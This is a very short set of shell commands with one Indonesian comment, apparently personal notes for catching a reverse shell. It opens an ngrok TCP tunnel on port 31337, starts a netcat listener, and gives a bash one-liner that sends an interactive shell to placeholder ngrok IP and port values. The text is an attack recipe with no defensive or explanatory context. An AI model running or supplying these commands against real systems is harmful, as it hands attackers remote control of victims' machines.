./ngrok tcp 31337

# ambil IP nya sama portnya
nc -lvp 31337
bash -i >& /dev/tcp/NGROK_IP/NGROK_PORT 0>&1